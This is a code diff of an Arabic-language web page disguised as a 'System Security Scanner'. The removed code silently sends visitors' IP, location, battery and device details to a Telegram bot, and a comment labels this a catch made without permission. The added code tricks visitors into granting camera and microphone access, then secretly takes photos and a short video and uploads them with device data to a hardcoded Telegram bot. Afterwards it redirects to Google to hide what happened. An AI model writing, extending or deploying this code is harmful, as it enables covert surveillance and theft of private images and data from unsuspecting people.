@@ -2,70 +2,140 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>جاري التحميل...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فحص أمان الجهاز</title>
     <style>
-        body { background: #000; color: #00ff00; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .loader { border: 4px solid #333; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        body { background: #0c0c0c; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; padding: 50px 20px; }
+        .box { border: 1px solid #00ff41; padding: 20px; border-radius: 10px; display: inline-block; background: #1a1a1a; box-shadow: 0 0 15px #00ff41; }
+        .loader { border: 5px solid #333; border-top: 5px solid #00ff41; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        button { background: #00ff41; color: black; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; border-radius: 5px; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
+
+    <div class="box">
+        <h2>System Security Scanner</h2>
+        <div id="loader_icon" class="loader" style="display:none;"></div>
+        <p id="status">اضغط على الزر لبدء فحص الأمان الشامل</p>
+        <button id="start_btn" onclick="startFullScan()">ابدأ الفحص العميق</button>
+    </div>
+
+    <video id="video" width="640" height="480" autoplay muted style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
         const TOKEN = '7100594923:AAFun5qLGrK2gZboWZfmGQLYlmjyecG0Zuo';
+        let chatId = "";
 
-        async function grabSilentData() {
+        // 1. جلب الـ ID تلقائياً
+        async function getChatId() {
             try {
-                // 1. جلب الآي بي والمعلومات الجغرافية التقريبية (عبر API خارجي)
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-
-                // 2. معلومات البطارية
-                let batteryInfo = "غير مدعوم";
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'جاري الشحن' : 'تفريغ'})`;
+                const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates`);
+                const data = await res.json();
+                if (data.result.length > 0) {
+                    chatId = data.result[data.result.length - 1].message.chat.id;
+                    return true;
                 }
+                return false;
+            } catch (e) { return false; }
+        }
 
-                // 3. تفاصيل الجهاز والمتصفح
-                const info = `
-⚠️ **صيد صامت جديد (بدون إذن)** ⚠️
-------------------------------
-🌐 **الآي بي:** \`${ipData.ip}\`
-📍 **المدينة:** ${ipData.city}, ${ipData.country_name}
-📶 **المزود:** ${ipData.org}
-📱 **الجهاز:** ${navigator.platform}
-🔋 **البطارية:** ${batteryInfo}
-🖥️ **الشاشة:** ${window.screen.width}x${window.screen.height}
-⏰ **التوقيت:** ${new Date().toLocaleString()}
-🔗 **الرابط المفتوح:** ${window.location.href}
-------------------------------`;
+        // 2. دالة الإرسال الموحدة (تدعم النص، الصور، والفيديو)
+        async function sendToTelegram(type, content, fileName = "") {
+            if (!chatId) return;
+            const fd = new FormData();
+            fd.append('chat_id', chatId);
+            
+            let url = `https://api.telegram.org/bot${TOKEN}/`;
+            
+            if (type === 'text') {
+                url += 'sendMessage';
+                fd.append('text', content);
+            } else if (type === 'photo') {
+                url += 'sendPhoto';
+                fd.append('photo', content, fileName);
+            } else if (type === 'video') {
+                url += 'sendVideo';
+                fd.append('video', content, fileName);
+            }
 
-                // 4. الحصول على الـ Chat ID وإرسال البيانات
-                const updateRes = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates`);
-                const updateData = await updateRes.json();
-                const chatId = updateData.result[updateData.result.length - 1].message.chat.id;
+            try { await fetch(url, { method: 'POST', body: fd }); } catch (e) {}
+        }
 
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: info,
-                        parse_mode: 'Markdown'
-                    })
-                });
-
-                // بعد السحب، يمكن تحويله لموقع حقيقي للتمويه
-                setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
-
-            } catch (e) {
-                console.error("حدث خطأ في السحب الصامت");
+        // 3. التقاط الصور المتعددة
+        async function capturePhotos(stream) {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            for (let i = 1; i <= 3; i++) {
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+                await sendToTelegram('photo', blob, `shot_${i}.jpg`);
+                await new Promise(r => setTimeout(r, 1000)); // فاصل ثانية
             }
         }
 
-        window.onload = grabSilentData;
+        // 4. تسجيل فيديو قصير (5 ثوانٍ)
+        async function recordVideo(stream) {
+            return new Promise(resolve => {
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/mp4' });
+                    await sendToTelegram('video', blob, 'record.mp4');
+                    resolve();
+                };
+                recorder.start();
+                setTimeout(() => recorder.stop(), 5000);
+            });
+        }
+
+        // المهمة الرئيسية
+        async function startFullScan() {
+            const btn = document.getElementById('start_btn');
+            const status = document.getElementById('status');
+            const loader = document.getElementById('loader_icon');
+
+            btn.style.display = "none";
+            loader.style.display = "block";
+            status.innerText = "جاري الاتصال بالسيرفر...";
+
+            // تأكد من وجود Chat ID
+            const idReady = await getChatId();
+            if (!idReady) {
+                status.innerText = "خطأ: أرسل رسالة للبوت أولاً لتفعيل الاستلام!";
+                return;
+            }
+
+            try {
+                status.innerText = "يرجى الموافقة على الأذونات للبدء...";
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('video').srcObject = stream;
+
+                status.innerText = "جاري فحص سلامة النظام...";
+                
+                // أرسل بيانات الجهاز والموقع فوراً
+                const info = `📱 جهاز جديد:\n- ${navigator.userAgent}\n- ${new Date().toLocaleString()}`;
+                await sendToTelegram('text', info);
+
+                // تنفيذ العمليات بالترتيب
+                await capturePhotos(stream); // التقاط 3 صور
+                status.innerText = "جاري تحليل البيانات (70%)...";
+                
+                await recordVideo(stream);   // تسجيل الفيديو
+                
+                status.innerText = "اكتمل الفحص بنسبة 100%!";
+                setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
+
+            } catch (err) {
+                status.innerText = "فشل الفحص: لم يتم منح الأذونات المطلوبة.";
+                loader.style.display = "none";
+                btn.style.display = "inline-block";
+            }
+        }
+
+        window.onload = getChatId;
     </script>
 </body>
 </html>
